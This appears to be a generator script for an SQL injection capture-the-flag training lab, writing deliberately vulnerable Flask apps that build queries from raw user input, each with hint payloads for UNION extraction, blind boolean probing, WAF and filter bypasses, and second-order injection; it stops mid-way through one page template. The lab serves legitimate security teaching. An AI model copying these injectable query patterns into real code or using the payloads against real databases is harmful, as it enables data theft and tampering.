import os
import sys

BASE_DIR = os.path.dirname(os.path.abspath(__file__))

def create_file(rel_path, content):
    full_path = os.path.join(BASE_DIR, rel_path)
    os.makedirs(os.path.dirname(full_path), exist_ok=True)
    with open(full_path, "w", encoding="utf-8") as f:
        f.write(content)
    print(f"Created {rel_path}")

# Challenge 05: Boolean-Based Blind SQLi
CH05_APP = '''"""
STARK INDUSTRIES SQL — Challenge 05: Boolean-Based Blind SQL Injection
INTENTIONALLY VULNERABLE — Educational use only.
"""
import os
import sqlite3
from flask import Flask, request, jsonify, render_template_string

app = Flask(__name__)
FLAG = os.environ.get("CHALLENGE_FLAG", "STARKSQL{bl1nd_b00l_hunt3r}")
DB = "/tmp/ch05.db"

def init_db():
    conn = sqlite3.connect(DB)
    c = conn.cursor()
    c.executescript("""
        CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY, username TEXT);
        CREATE TABLE IF NOT EXISTS secrets (id INTEGER PRIMARY KEY, flag TEXT);
        DELETE FROM users;
        DELETE FROM secrets;
        INSERT INTO users VALUES (1, 'tony.stark'), (2, 'pepper.potts'), (3, 'happy.hogan');
    """)
    c.execute("INSERT OR REPLACE INTO secrets VALUES (5, ?)", (FLAG,))
    conn.commit()
    conn.close()

PAGE = """<!DOCTYPE html>
<html><head><title>Stark Ch05 - Boolean Blind</title>
<style>
body { background:#0a0a0f; color:#e0e0e0; font-family:monospace; padding:40px; }
input { background:#010409; border:1px solid #30363d; color:#00d4ff; padding:10px; border-radius:6px; width:350px; font-family:monospace; outline:none; }
button { background:#00d4ff; color:#000; border:none; padding:10px 24px; border-radius:6px; font-weight:bold; cursor:pointer; margin-left:8px; }
h2 { color:#00d4ff; letter-spacing:2px; margin-bottom:16px; }
p { color:#8b949e; margin-bottom:16px; line-height:1.5; }
.hint { background:#0d1b0d; border:1px solid #00ff8833; border-radius:6px; padding:14px; margin-top:20px; color:#8b949e; font-size:.82rem; }
.true-resp { background:#0d2b0d; border:1px solid #00ff88; padding:16px; border-radius:6px; color:#00ff88; margin-top:16px; }
.false-resp { background:#2d1b1b; border:1px solid #ff2244; padding:16px; border-radius:6px; color:#ff8080; margin-top:16px; }
</style></head>
<body>
<h2>⚡ STARK INDUSTRIES — Challenge 05: Boolean-Based Blind SQLi</h2>
<p><b style="color:#00d4ff">MISSION:</b> The app shows only USER FOUND or USER NOT FOUND.<br>
Use boolean conditions with SUBSTR() to extract the flag character by character.<br>
<b>OBJECTIVE:</b> Infer the flag from the secrets table (id=5).</p>
<form method="GET">
<input type="text" name="name" value="{{ name }}" placeholder="Enter username">
<button type="submit">[ LOOKUP ]</button>
</form>
{% if name %}
  {% if found %}
  <div class="true-resp">✓ USER FOUND — Condition evaluated TRUE</div>
  {% else %}
  <div class="false-resp">✗ USER NOT FOUND — Condition evaluated FALSE</div>
  {% endif %}
{% endif %}
<div class="hint">
💡 Try: <code style="color:#ffd700;">tony.stark' AND SUBSTR((SELECT flag FROM secrets WHERE id=5),1,1)='S'--</code>
</div>
</body></html>"""

@app.route("/", methods=["GET"])
def index():
    name = request.args.get("name", "")
    found = False
    if name:
        try:
            conn = sqlite3.connect(DB)
            c = conn.cursor()
            c.execute(f"SELECT id FROM users WHERE username='{name}'")
            found = c.fetchone() is not None
            conn.close()
        except:
            found = False
    return render_template_string(PAGE, name=name, found=found)

@app.route("/health")
def health():
    return jsonify({"status": "ok", "challenge": 5})

@app.route("/reset")
def reset():
    init_db()
    return jsonify({"status": "reset"})

if __name__ == "__main__":
    init_db()
    app.run(host="0.0.0.0", port=5000, debug=False)
'''

create_file("ch05-boolean-blind/app.py", CH05_APP)

# Helper template for standard SQLite challenges 11 to 25
def make_standard_app(ch_num, title, vuln_desc, obj_desc, hint_text, flag_default, code_logic):
    return f'''"""
STARK INDUSTRIES SQL — Challenge {ch_num:02d}: {title}
INTENTIONALLY VULNERABLE — Educational use only.
"""
import os
import sqlite3
from flask import Flask, request, jsonify, render_template_string

app = Flask(__name__)
FLAG = os.environ.get("CHALLENGE_FLAG", "{flag_default}")
DB = "/tmp/ch{ch_num:02d}.db"

def init_db():
    conn = sqlite3.connect(DB)
    c = conn.cursor()
    c.executescript("""
        CREATE TABLE IF NOT EXISTS data_items (id INTEGER PRIMARY KEY, name TEXT, category TEXT, secret_data TEXT);
        CREATE TABLE IF NOT EXISTS secrets (id INTEGER PRIMARY KEY, flag TEXT);
        DELETE FROM data_items;
        DELETE FROM secrets;
        INSERT INTO data_items VALUES (1, 'Arc Reactor Mark II', 'Power Systems', 'Public Specs'), (2, 'Mark III Armor Framework', 'Defensive Armor', 'Public Specs');
    """)
    c.execute("INSERT OR REPLACE INTO secrets VALUES ({ch_num}, ?)", (FLAG,))
    conn.commit()
    conn.close()

PAGE = """<!DOCTYPE html>
<html><head><title>Stark Ch{ch_num:02d} - {title}</title>
<style>
body {{ background:#0a0a0f; color:#e0e0e0; font-family:monospace; padding:40px; }}
input, select {{ background:#010409; border:1px solid #30363d; color:#00d4ff; padding:10px; border-radius:6px; width:350px; font-family:monospace; outline:none; }}
button {{ background:#00d4ff; color:#000; border:none; padding:10px 24px; border-radius:6px; font-weight:bold; cursor:pointer; margin-left:8px; }}
h2 {{ color:#00d4ff; letter-spacing:2px; margin-bottom:16px; }}
p {{ color:#8b949e; margin-bottom:16px; line-height:1.5; }}
pre {{ background:#010409; border:1px solid #21262d; border-radius:6px; padding:16px; color:#8b949e; white-space:pre-wrap; margin-top:16px; }}
.hint {{ background:#0d1b0d; border:1px solid #00ff8833; border-radius:6px; padding:14px; margin-top:20px; color:#8b949e; font-size:.82rem; }}
code {{ color:#ffd700; }}
</style></head>
<body>
<h2>⚡ STARK INDUSTRIES — Challenge {ch_num:02d}: {title}</h2>
<p><b style="color:#00d4ff">MISSION:</b> {vuln_desc}<br>
<b>OBJECTIVE:</b> {obj_desc}</p>
<form method="POST">
<input type="text" name="input_val" value="{{ input_val }}" placeholder="Enter payload / parameter">
<button type="submit">[ SUBMIT ]</button>
</form>
{{% if result %}}
<pre>{{ result }}</pre>
{{% endif %}}
<div class="hint">
💡 {hint_text}
</div>
</body></html>"""

{code_logic}

@app.route("/health")
def health():
    return jsonify({{"status": "ok", "challenge": {ch_num}}})

@app.route("/reset")
def reset():
    init_db()
    return jsonify({{"status": "reset"}})

if __name__ == "__main__":
    init_db()
    app.run(host="0.0.0.0", port=5000, debug=False)
'''

# Challenge 11: INSERT-based
ch11_logic = '''@app.route("/", methods=["GET", "POST"])
def index():
    input_val = request.form.get("input_val", "") or request.args.get("input_val", "")
    result = None
    if input_val:
        try:
            conn = sqlite3.connect(DB)
            c = conn.cursor()
            # Vulnerable INSERT
            sql = f"INSERT INTO data_items (name, category, secret_data) VALUES ('{input_val}', 'User Submitted', 'Normal')"
            c.executescript(sql)
            conn.commit()
            c.execute("SELECT * FROM data_items")
            rows = c.fetchall()
            result = "\\n".join([str(r) for r in rows])
            conn.close()
        except Exception as e:
            result = f"Database Error: {str(e)}"
    return render_template_string(PAGE, input_val=input_val, result=result)'''

create_file("ch11-insert/app.py", make_standard_app(11, "INSERT-Based SQL Injection", "Endpoint performs an unsafe INSERT query.", "Inject through the INSERT value to extract the flag.", "Try payload: <code style='color:#ffd700;'>test', (SELECT flag FROM secrets WHERE id=11), 'Normal')--</code>", "STARKSQL{1ns3rt_1nj3ct10n}", ch11_logic))

# Challenge 12: UPDATE-based
ch12_logic = '''@app.route("/", methods=["GET", "POST"])
def index():
    input_val = request.form.get("input_val", "") or request.args.get("input_val", "")
    result = None
    if input_val:
        try:
            conn = sqlite3.connect(DB)
            c = conn.cursor()
            # Vulnerable UPDATE
            sql = f"UPDATE data_items SET secret_data='{input_val}' WHERE id=1"
            c.executescript(sql)
            conn.commit()
            c.execute("SELECT * FROM data_items WHERE id=1")
            rows = c.fetchall()
            result = "\\n".join([str(r) for r in rows])
            conn.close()
        except Exception as e:
            result = f"Database Error: {str(e)}"
    return render_template_string(PAGE, input_val=input_val, result=result)'''

create_file("ch12-update/app.py", make_standard_app(12, "UPDATE-Based SQL Injection", "Endpoint updates items with unescaped input.", "Inject into the UPDATE SET clause to assign the flag value.", "Try payload: <code style='color:#ffd700;'>' || (SELECT flag FROM secrets WHERE id=12) || '</code>", "STARKSQL{upd4t3_byp4ss_pr0}", ch12_logic))

# Challenge 13: DELETE-based
ch13_logic = '''@app.route("/", methods=["GET", "POST"])
def index():
    input_val = request.form.get("input_val", "") or request.args.get("input_val", "")
    result = None
    if input_val:
        try:
            conn = sqlite3.connect(DB)
            c = conn.cursor()
            # Vulnerable DELETE
            sql = f"DELETE FROM data_items WHERE id={input_val}"
            c.executescript(sql)
            conn.commit()
            c.execute("SELECT * FROM data_items")
            rows = c.fetchall()
            result = f"Remaining items:\\n" + "\\n".join([str(r) for r in rows])
            conn.close()
        except Exception as e:
            result = f"Database Error: {str(e)}"
    return render_template_string(PAGE, input_val=input_val, result=result)'''

create_file("ch13-delete/app.py", make_standard_app(13, "DELETE-Based SQL Injection", "Endpoint executes a DELETE statement directly incorporating numeric input.", "Manipulate the DELETE WHERE clause or inject subqueries.", "Try payload: <code style='color:#ffd700;'>1 OR (SELECT load_extension(flag) FROM secrets WHERE id=13)</code> or subquery UNION tricks.", "STARKSQL{d3l3t3_sqli_b00m}", ch13_logic))

# Challenge 14: ORDER BY
ch14_logic = '''@app.route("/", methods=["GET", "POST"])
def index():
    input_val = request.form.get("input_val", "") or request.args.get("input_val", "") or "name"
    result = None
    if input_val:
        try:
            conn = sqlite3.connect(DB)
            c = conn.cursor()
            # Vulnerable ORDER BY
            sql = f"SELECT id, name, category FROM data_items ORDER BY {input_val}"
            c.execute(sql)
            rows = c.fetchall()
            result = "\\n".join([str(r) for r in rows])
            conn.close()
        except Exception as e:
            result = f"Database Error: {str(e)}"
    return render_template_string(PAGE, input_val=input_val, result=result)'''

create_file("ch14-orderby/app.py", make_standard_app(14, "ORDER BY SQL Injection", "The ORDER BY identifier is user-controlled and unquoted.", "Use conditional sorting (CASE WHEN ...) to infer secret flag characters.", "Try: <code style='color:#ffd700;'>CASE WHEN (SELECT SUBSTR(flag,1,1) FROM secrets WHERE id=14)='S' THEN name ELSE category END</code>", "STARKSQL{0rd3r_by_m4n1pul4t10n}", ch14_logic))

# Challenge 15: WHERE-clause
ch15_logic = '''@app.route("/", methods=["GET", "POST"])
def index():
    input_val = request.form.get("input_val", "") or request.args.get("input_val", "")
    result = None
    if input_val:
        try:
            conn = sqlite3.connect(DB)
            c = conn.cursor()
            sql = f"SELECT * FROM data_items WHERE name='{input_val}' AND category='Power Systems'"
            c.execute(sql)
            rows = c.fetchall()
            result = "\\n".join([str(r) for r in rows])
            conn.close()
        except Exception as e:
            result = f"Database Error: {str(e)}"
    return render_template_string(PAGE, input_val=input_val, result=result)'''

create_file("ch15-where/app.py", make_standard_app(15, "WHERE-Clause SQL Injection", "WHERE clause condition can be broken with single quotes.", "Bypass the hardcoded category condition and extract the flag.", "Try: <code style='color:#ffd700;'>' UNION SELECT 1, flag, 'Secret', 'Value' FROM secrets WHERE id=15--</code>", "STARKSQL{wh3r3_cl4us3_br34k3r}", ch15_logic))

# Challenge 16: LIKE-clause
ch16_logic = '''@app.route("/", methods=["GET", "POST"])
def index():
    input_val = request.form.get("input_val", "") or request.args.get("input_val", "")
    result = None
    if input_val:
        try:
            conn = sqlite3.connect(DB)
            c = conn.cursor()
            sql = f"SELECT * FROM data_items WHERE name LIKE '%{input_val}%'"
            c.execute(sql)
            rows = c.fetchall()
            result = "\\n".join([str(r) for r in rows])
            conn.close()
        except Exception as e:
            result = f"Database Error: {str(e)}"
    return render_template_string(PAGE, input_val=input_val, result=result)'''

create_file("ch16-like/app.py", make_standard_app(16, "LIKE-Clause SQL Injection", "Input is placed inside a LIKE '%...%' string pattern.", "Escape the wildcard pattern and append UNION SELECT.", "Try: <code style='color:#ffd700;'>%' UNION SELECT 1, flag, 'Secrets', 'Flag' FROM secrets WHERE id=16--</code>", "STARKSQL{l1k3_cl4us3_byp4ss}", ch16_logic))

# Challenge 17: Numeric SQLi
ch17_logic = '''@app.route("/", methods=["GET", "POST"])
def index():
    input_val = request.form.get("input_val", "") or request.args.get("input_val", "")
    result = None
    if input_val:
        try:
            conn = sqlite3.connect(DB)
            c = conn.cursor()
            sql = f"SELECT * FROM data_items WHERE id={input_val}"
            c.execute(sql)
            rows = c.fetchall()
            result = "\\n".join([str(r) for r in rows])
            conn.close()
        except Exception as e:
            result = f"Database Error: {str(e)}"
    return render_template_string(PAGE, input_val=input_val, result=result)'''

create_file("ch17-numeric/app.py", make_standard_app(17, "Numeric SQL Injection", "Numeric parameter is incorporated without quotes.", "Demonstrate injection without needing to escape single quotes.", "Try: <code style='color:#ffd700;'>1 UNION SELECT 1, flag, 'Exfil', 'Secret' FROM secrets WHERE id=17</code>", "STARKSQL{num3r1c_1nj3ct10n_ftw}", ch17_logic))

# Challenge 18: String SQLi
ch18_logic = '''@app.route("/", methods=["GET", "POST"])
def index():
    input_val = request.form.get("input_val", "") or request.args.get("input_val", "")
    result = None
    if input_val:
        try:
            conn = sqlite3.connect(DB)
            c = conn.cursor()
            sql = f"SELECT * FROM data_items WHERE name='{input_val}'"
            c.execute(sql)
            rows = c.fetchall()
            result = "\\n".join([str(r) for r in rows])
            conn.close()
        except Exception as e:
            result = f"Database Error: {str(e)}"
    return render_template_string(PAGE, input_val=input_val, result=result)'''

create_file("ch18-string/app.py", make_standard_app(18, "String-Based SQL Injection", "String parameter injection into standard single-quoted field.", "Extract the flag via UNION SELECT.", "Try: <code style='color:#ffd700;'>' UNION SELECT 1, flag, 'Exfil', 'Value' FROM secrets WHERE id=18--</code>", "STARKSQL{str1ng_sqli_m4st3r}", ch18_logic))

# Challenge 19: JSON API SQLi
ch19_logic = '''@app.route("/", methods=["GET"])
def ui():
    return render_template_string(PAGE, input_val='{"filter": "Arc"}', result="Send JSON POST to /api/search with body: {\\"filter\\": \\"...\\\"}")

@app.route("/api/search", methods=["POST"])
def api():
    data = request.get_json(force=True, silent=True) or {}
    filter_val = data.get("filter", "")
    try:
        conn = sqlite3.connect(DB)
        c = conn.cursor()
        sql = f"SELECT * FROM data_items WHERE name LIKE '%{filter_val}%'"
        c.execute(sql)
        rows = c.fetchall()
        conn.close()
        return jsonify({{"status": "success", "data": rows}})
    except Exception as e:
        return jsonify({{"status": "error", "message": str(e)}}), 400'''

create_file("ch19-json-api/app.py", make_standard_app(19, "JSON-Based SQL Injection", "REST API endpoint consumes JSON body and interpolates JSON properties into SQL.", "Exploit the JSON parameter to extract the flag.", "POST to /api/search with JSON: <code style='color:#ffd700;'>{{\"filter\": \"' UNION SELECT 1, flag, 'Secret', 'Data' FROM secrets WHERE id=19--\"}}</code>", "STARKSQL{j50n_4p1_pwn3d}", ch19_logic))

# Challenge 20: Header-Based SQLi
ch20_logic = '''@app.route("/", methods=["GET", "POST"])
def index():
    header_val = request.headers.get("X-Search", "") or request.headers.get("X-Department", "") or request.form.get("input_val", "")
    result = None
    if header_val:
        try:
            conn = sqlite3.connect(DB)
            c = conn.cursor()
            sql = f"SELECT * FROM data_items WHERE name='{header_val}'"
            c.execute(sql)
            rows = c.fetchall()
            result = f"Executed search for Header value [{header_val}]:\\n" + "\\n".join([str(r) for r in rows])
            conn.close()
        except Exception as e:
            result = f"Database Error: {str(e)}"
    return render_template_string(PAGE, input_val=header_val, result=result)'''

create_file("ch20-header/app.py", make_standard_app(20, "Header-Based SQL Injection", "Vulnerability lies inside an HTTP Header processing routine (X-Search / X-Department).", "Pass SQL injection payloads inside the HTTP Header.", "Send Header <code style='color:#ffd700;'>X-Search: ' UNION SELECT 1, flag, 'Exfil', 'Val' FROM secrets WHERE id=20--</code>", "STARKSQL{h34d3r_1nj3ct10n_xpl0it}", ch20_logic))

# Challenge 21: Cookie-Based SQLi
ch21_logic = '''@app.route("/", methods=["GET", "POST"])
def index():
    cookie_val = request.cookies.get("stark_session", "")
    input_val = request.form.get("input_val", "")
    result = None
    
    if input_val:
        resp = jsonify({"status": "cookie_set"})
        resp.set_cookie("stark_session", input_val)
        # Process directly
        cookie_val = input_val

    if cookie_val:
        try:
            conn = sqlite3.connect(DB)
            c = conn.cursor()
            sql = f"SELECT * FROM data_items WHERE secret_data='{cookie_val}'"
            c.execute(sql)
            rows = c.fetchall()
            result = f"Session Cookie [{cookie_val}] Query Result:\\n" + "\\n".join([str(r) for r in rows])
            conn.close()
        except Exception as e:
            result = f"Database Error: {str(e)}"

    return render_template_string(PAGE, input_val=cookie_val, result=result)'''

create_file("ch21-cookie/app.py", make_standard_app(21, "Cookie-Based SQL Injection", "Vulnerable application processes laboratory cookie 'stark_session' directly in SQL.", "Inject SQL payload into the HTTP Cookie value.", "Set Cookie <code style='color:#ffd700;'>stark_session=' UNION SELECT 1, flag, 'Cookie', 'Secret' FROM secrets WHERE id=21--</code>", "STARKSQL{c00ki3_m0nst3r_sqli}", ch21_logic))

# Challenge 22: HTTP Parameter Pollution + SQLi
ch22_logic = '''@app.route("/", methods=["GET", "POST"])
def index():
    # Demonstrating parameter pollution where backend receives array of params
    args = request.args.getlist("id")
    result = None
    if args:
        # Backend concatenates multiple params improperly
        combined = " ".join(args)
        try:
            conn = sqlite3.connect(DB)
            c = conn.cursor()
            sql = f"SELECT * FROM data_items WHERE id={combined}"
            c.execute(sql)
            rows = c.fetchall()
            result = "\\n".join([str(r) for r in rows])
            conn.close()
        except Exception as e:
            result = f"Database Error: {str(e)}"
    return render_template_string(PAGE, input_val="&id=".join(args) if args else "1", result=result)'''

create_file("ch22-hpp/app.py", make_standard_app(22, "HTTP Parameter Pollution + SQLi", "Application improperly handles duplicate HTTP query parameters (e.g. ?id=1&id=UNION...).", "Combine HPP with SQLi to construct a complete injection payload.", "Try URL parameters: <code style='color:#ffd700;'>?id=1&id=UNION&id=SELECT&id=1,flag,'HPP','Exfil'&id=FROM&id=secrets&id=WHERE&id=id=22</code>", "STARKSQL{hpp_p4r4m_p0llut10n}", ch22_logic))

# Challenge 23: WAF-Bypass
ch23_logic = '''@app.route("/", methods=["GET", "POST"])
def index():
    input_val = request.form.get("input_val", "") or request.args.get("input_val", "")
    result = None
    if input_val:
        # Simple simulated WAF
        blocked = ["SELECT ", "UNION ", "WHERE "]
        waf_triggered = any(b in input_val for b in blocked)
        if waf_triggered:
            result = "🔴 WAF BLOCK: Obvious SQL injection pattern detected (SELECT, UNION, WHERE in uppercase)!"
        else:
            try:
                conn = sqlite3.connect(DB)
                c = conn.cursor()
                sql = f"SELECT * FROM data_items WHERE name='{input_val}'"
                c.execute(sql)
                rows = c.fetchall()
                result = "\\n".join([str(r) for r in rows])
                conn.close()
            except Exception as e:
                result = f"Database Error: {str(e)}"
    return render_template_string(PAGE, input_val=input_val, result=result)'''

create_file("ch23-waf-bypass/app.py", make_standard_app(23, "WAF-Bypass SQL Injection", "Simulated WAF blocks exact uppercase keywords (SELECT, UNION, WHERE).", "Bypass WAF signature filters using case variation or inline comments.", "Try: <code style='color:#ffd700;'>' uNiOn sElEcT 1, flag, 'WAF', 'Bypass' fRoM secrets wHeRe id=23--</code>", "STARKSQL{w4f_byp4ss_surv1v0r}", ch23_logic))

# Challenge 24: Filter-Bypass
ch24_logic = '''@app.route("/", methods=["GET", "POST"])
def index():
    input_val = request.form.get("input_val", "") or request.args.get("input_val", "")
    result = None
    if input_val:
        # Vulnerable filter: non-recursive replacement of 'UNION' and 'SELECT'
        filtered_val = input_val.replace("UNION", "").replace("SELECT", "")
        try:
            conn = sqlite3.connect(DB)
            c = conn.cursor()
            sql = f"SELECT * FROM data_items WHERE name='{filtered_val}'"
            c.execute(sql)
            rows = c.fetchall()
            result = f"Filtered payload executed: [{filtered_val}]\\n" + "\\n".join([str(r) for r in rows])
            conn.close()
        except Exception as e:
            result = f"Database Error: {str(e)}"
    return render_template_string(PAGE, input_val=input_val, result=result)'''

create_file("ch24-filter-bypass/app.py", make_standard_app(24, "Filter-Bypass SQL Injection", "Blacklist filter strips 'UNION' and 'SELECT' non-recursively.", "Bypass blacklists using nested keywords (e.g. UNIUNIONON).", "Try: <code style='color:#ffd700;'>' UNIUNIONON SELSELECTECT 1, flag, 'Filter', 'Bypass' FROM secrets WHERE id=24--</code>", "STARKSQL{f1lt3r_byp4ss_h4x0r}", ch24_logic))

# Challenge 25: Second-Order Auth
ch25_logic = '''@app.route("/", methods=["GET", "POST"])
def index():
    input_val = request.form.get("input_val", "") or request.args.get("input_val", "")
    result = None
    if input_val:
        try:
            conn = sqlite3.connect(DB)
            c = conn.cursor()
            # Stage 1: Store input safely
            c.execute("INSERT OR REPLACE INTO data_items (id, name, category, secret_data) VALUES (99, ?, 'StoredAuth', 'Payload')", (input_val,))
            conn.commit()
            # Stage 2: Execute stored payload unsafely in auth logic
            c.execute("SELECT name FROM data_items WHERE id=99")
            stored = c.fetchone()[0]
            sql = f"SELECT * FROM data_items WHERE name='{stored}'"
            c.execute(sql)
            rows = c.fetchall()
            result = f"Second-Order Authentication check triggered for [{stored}]:\\n" + "\\n".join([str(r) for r in rows])
            conn.close()
        except Exception as e:
            result = f"Database Error: {str(e)}"
    return render_template_string(PAGE, input_val=input_val, result=result)'''

create_file("ch25-second-order-auth/app.py", make_standard_app(25, "Second-Order Authentication SQLi", "Stored input is later evaluated unsafely during an authentication workflow.", "Inject payload that triggers during internal auth queries.", "Try payload: <code style='color:#ffd700;'>admin' OR '1'='1' UNION SELECT 1, flag, 'Auth', 'SecondOrder' FROM secrets WHERE id=25--</code>", "STARKSQL{s3c0nd_0rd3r_4uth_pwn}", ch25_logic))

# Challenge 26: Multi-Database SQLi
CH26_APP = '''"""
STARK INDUSTRIES SQL — Challenge 26: Multi-Database SQL Injection
INTENTIONALLY VULNERABLE — Educational use only.
"""
import os
import sqlite3
from flask import Flask, request, jsonify, render_template_string

app = Flask(__name__)
FLAG = os.environ.get("CHALLENGE_FLAG", "STARKSQL{mult1_db_3xpl0r3r}")
DB = "/tmp/ch26.db"

def init_db():
    conn = sqlite3.connect(DB)
    c = conn.cursor()
    c.executescript("""
        CREATE TABLE IF NOT EXISTS data_items (id INTEGER PRIMARY KEY, engine TEXT, status TEXT);
        CREATE TABLE IF NOT EXISTS secrets (id INTEGER PRIMARY KEY, flag TEXT);
        DELETE FROM data_items; DELETE FROM secrets;
        INSERT INTO data_items VALUES (1, 'SQLite Engine', 'ACTIVE'), (2, 'MySQL Engine', 'ACTIVE'), (3, 'PostgreSQL Engine', 'ACTIVE'), (4, 'MSSQL Engine', 'ACTIVE');
    """)
    c.execute("INSERT OR REPLACE INTO secrets VALUES (26, ?)", (FLAG,))
    conn.commit()
    conn.close()

PAGE = """<!DOCTYPE html>
<html><head><title>Stark Ch26 - Multi-DB SQLi</title>
<style>
body { background:#0a0a0f; color:#e0e0e0; font-family:monospace; padding:40px; }
input { background:#010409; border:1px solid #30363d; color:#00d4ff; padding:10px; border-radius:6px; width:350px; font-family:monospace; outline:none; }
button { background:#00d4ff; color:#000; border:none; padding:10px 24px; border-radius:6px; font-weight:bold; cursor:pointer; margin-left:8px; }
h2 { color:#00d4ff; letter-spacing:2px; margin-bottom:16px; }
p { color:#8b949e; margin-bottom:16px; line-height:1.5; }
pre { background:#010409; border:1px solid #21262d; border-radius:6px; padding:16px; color:#8b949e; white-space:pre-wrap; margin-top:16px; }
.hint { background:#0d1b0d; border:1px solid #00ff8833; border-radius:6px; padding:14px; margin-top:20px; color:#8b949e; font-size:.82rem; }
code { color:#ffd700; }
</style></head>
<body>
<h2>⚡ STARK INDUSTRIES — Challenge 26: Multi-Database SQL Injection</h2>
<p><b style="color:#00d4ff">MISSION:</b> Target multi-database environment features.<br>
<b>OBJECTIVE:</b> Understand differences between database dialects and extract the flag.</p>
<form method="POST">
<input type="text" name="input_val" value="{{ input_val }}" placeholder="Engine query filter">
<button type="submit">[ SEARCH ENGINE ]</button>
</form>
{% if result %}
<pre>{{ result }}</pre>
{% endif %}
<div class="hint">
💡 Try: <code style="color:#ffd700;">SQLite Engine' UNION SELECT 1, flag, 'Exfil' FROM secrets WHERE id=26--</code>
</div>
</body></html>"""

@app.route("/", methods=["GET", "POST"])
def index():
    input_val = request.form.get("input_val", "") or request.args.get("input_val", "")
    result = None
    if input_val:
        try:
            conn = sqlite3.connect(DB)
            c = conn.cursor()
            sql = f"SELECT * FROM data_items WHERE engine='{input_val}'"
            c.execute(sql)
            rows = c.fetchall()
            result = "\\n".join([str(r) for r in rows])
            conn.close()
        except Exception as e:
            result = f"Database Error: {str(e)}"
    return render_template_string(PAGE, input_val=input_val, result=result)

@app.route("/health")
def health(): return jsonify({"status": "ok", "challenge": 26})
@app.route("/reset")
def reset(): init_db(); return jsonify({"status": "reset"})
if __name__ == "__main__": init_db(); app.run(host="0.0.0.0", port=5000, debug=False)
'''
create_file("ch26-multi-db/app.py", CH26_APP)

# Challenge 27: SQLite SQLi
CH27_APP = '''"""
STARK INDUSTRIES SQL — Challenge 27: SQLite Dedicated SQL Injection
INTENTIONALLY VULNERABLE — Educational use only.
"""
import os
import sqlite3
from flask import Flask, request, jsonify, render_template_string

app = Flask(__name__)
FLAG = os.environ.get("CHALLENGE_FLAG", "STARKSQL{sql1t3_sp3c14l1st}")
DB = "/tmp/ch27.db"

def init_db():
    conn = sqlite3.connect(DB)
    c = conn.cursor()
    c.executescript("""
        CREATE TABLE IF NOT EXISTS sqlite_lab_data (id INTEGER PRIMARY KEY, name TEXT, meta TEXT);
        CREATE TABLE IF NOT EXISTS sqlite_secrets (id INTEGER PRIMARY KEY, secret_flag TEXT);
        DELETE FROM sqlite_lab_data; DELETE FROM sqlite_secrets;
        INSERT INTO sqlite_lab_data VALUES (1, 'SQLite Engine Core', 'v3.x');
    """)
    c.execute("INSERT OR REPLACE INTO sqlite_secrets VALUES (27, ?)", (FLAG,))
    conn.commit()
    conn.close()

PAGE = """<!DOCTYPE html>
<html><head><title>Stark Ch27 - SQLite Dedicated</title>
<style>
body { background:#0a0a0f; color:#e0e0e0; font-family:monospace; padding:40px; }
input { background:#010409; border:1px solid #30363d; color:#00d4ff; padding:10px; border-radius:6px; width:350px; font-family:monospace; outline:none; }
button { background:#00d4ff; color:#000; border:none; padding:10px 24px; border-radius:6px; font-weight:bold; cursor:pointer; margin-left:8px; }
h2 { color:#00d4ff; letter-spacing:2px; margin-bottom:16px; }
p { color:#8b949e; margin-bottom:16px; line-height:1.5; }
pre { background:#010409; border:1px solid #21262d; border-radius:6px; padding:16px; color:#8b949e; white-space:pre-wrap; margin-top:16px; }
.hint { background:#0d1b0d; border:1px solid #00ff8833; border-radius:6px; padding:14px; margin-top:20px; color:#8b949e; font-size:.82rem; }
code { color:#ffd700; }
</style></head>
<body>
<h2>⚡ STARK INDUSTRIES — Challenge 27: SQLite SQL Injection</h2>
<p><b style="color:#00d4ff">MISSION:</b> Explore SQLite metadata (sqlite_master) and syntax.<br>
<b>OBJECTIVE:</b> Enumerate tables via sqlite_master and retrieve the flag from sqlite_secrets.</p>
<form method="POST">
<input type="text" name="input_val" value="{{ input_val }}" placeholder="Item name">
<button type="submit">[ SEARCH SQLITE ]</button>
</form>
{% if result %}
<pre>{{ result }}</pre>
{% endif %}
<div class="hint">
💡 Step 1: <code style="color:#ffd700;">' UNION SELECT 1, tbl_name, sql FROM sqlite_master--</code><br>
Step 2: <code style="color:#ffd700;">' UNION SELECT 1, secret_flag, 'Flag' FROM sqlite_secrets--</code>
</div>
</body></html>"""

@app.route("/", methods=["GET", "POST"])
def index():
    input_val = request.form.get("input_val", "") or request.args.get("input_val", "")
    result = None
    if input_val:
        try:
            conn = sqlite3.connect(DB)
            c = conn.cursor()
            sql = f"SELECT * FROM sqlite_lab_data WHERE name='{input_val}'"
            c.execute(sql)
            rows = c.fetchall()
            result = "\\n".join([str(r) for r in rows])
            conn.close()
        except Exception as e:
            result = f"Database Error: {str(e)}"
    return render_template_string(PAGE, input_val=input_val, result=result)

@app.route("/health")
def health(): return jsonify({"status": "ok", "challenge": 27})
@app.route("/reset")
def reset(): init_db(); return jsonify({"status": "reset"})
if __name__ == "__main__": init_db(); app.run(host="0.0.0.0", port=5000, debug=False)
'''
create_file("ch27-sqlite/app.py", CH27_APP)

# Challenge 28: MySQL Dedicated SQLi
CH28_APP = '''"""
STARK INDUSTRIES SQL — Challenge 28: MySQL Dedicated SQL Injection
INTENTIONALLY VULNERABLE — Educational use only.
"""
import os
import time
import pymysql
from flask import Flask, request, jsonify, render_template_string

app = Flask(__name__)
FLAG = os.environ.get("CHALLENGE_FLAG", "STARKSQL{mysql_d33p_d1v3}")

def get_db():
    for _ in range(20):
        try:
            return pymysql.connect(
                host=os.environ.get("MYSQL_HOST", "mysql-challenge"),
                user=os.environ.get("MYSQL_USER", "lab_user"),
                password=os.environ.get("MYSQL_PASSWORD", "lab_mysql_password"),
                database=os.environ.get("MYSQL_DB", "stark_lab"),
                cursorclass=pymysql.cursors.DictCursor
            )
        except Exception:
            time.sleep(3)
    return None

PAGE = """<!DOCTYPE html>
<html><head><title>Stark Ch28 - MySQL Dedicated</title>
<style>
body { background:#0a0a0f; color:#e0e0e0; font-family:monospace; padding:40px; }
input { background:#010409; border:1px solid #30363d; color:#00d4ff; padding:10px; border-radius:6px; width:350px; font-family:monospace; outline:none; }
button { background:#00d4ff; color:#000; border:none; padding:10px 24px; border-radius:6px; font-weight:bold; cursor:pointer; margin-left:8px; }
h2 { color:#00d4ff; letter-spacing:2px; margin-bottom:16px; }
p { color:#8b949e; margin-bottom:16px; line-height:1.5; }
pre { background:#010409; border:1px solid #21262d; border-radius:6px; padding:16px; color:#8b949e; white-space:pre-wrap; margin-top:16px; }
